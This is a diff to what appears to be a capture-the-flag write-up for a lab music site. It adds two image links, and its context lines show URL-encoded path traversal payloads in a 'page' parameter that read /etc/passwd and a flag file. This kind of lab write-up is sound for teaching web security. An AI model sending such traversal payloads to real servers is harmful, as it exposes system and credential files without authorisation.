@@ -1,5 +1,7 @@
 As we hit the URL `http://10.48.136.217/` in the browser, it gave us a homepage of songs. 🎵
 
+![homepage_pic](homepage_pic.png)
+
 Here is the source code:
 ```html
 
@@ -288,3 +290,4 @@ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:
 Now the endpoint `http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd` is giving us the content of `/etc/passwd`.
 
 And if we modify the URL to `http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fflag.txt`, we get the flag! 🚩
+![flag_img](flag_img.jpg)
